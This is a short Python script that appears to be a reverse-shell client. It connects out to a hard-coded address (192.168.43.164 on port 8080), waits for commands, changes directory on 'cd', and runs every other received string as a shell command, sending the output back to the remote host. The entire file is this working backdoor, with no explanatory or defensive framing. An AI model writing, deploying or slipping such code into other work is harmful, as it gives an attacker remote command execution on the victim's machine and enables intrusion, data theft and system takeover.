import socket
import os
import subprocess

soc=socket.socket()
host="192.168.43.164"
port=8080
HEADERSIZE=10
soc.connect((host,port))

while True:
    data=soc.recv(1024)
    if data[:2].decode("utf-8")=="cd":
        try:
            os.chdir(data[3:].decode("utf-8"))
            currentWD=os.getcwd()+">"
            data=currentWD
            response=f'{len(data):<{HEADERSIZE}}'+data
            soc.send(str.encode(response,"utf-8"))
        except OSError as error:
            currentWD=os.getcwd()+">"
            data=str(error)+"\n"+currentWD
            response=f'{len(data):<{HEADERSIZE}}'+data
            soc.send(str.encode(response,"utf-8"))

    elif len(data)>0:
        cmd= subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output=str(cmd.stdout.read() + cmd.stderr.read(),"utf-8")
        currentWD=os.getcwd()+">"
        data=output+currentWD
        response=f'{len(data):<{HEADERSIZE}}'+data
        soc.send(str.encode(response,"utf-8"))
        
    
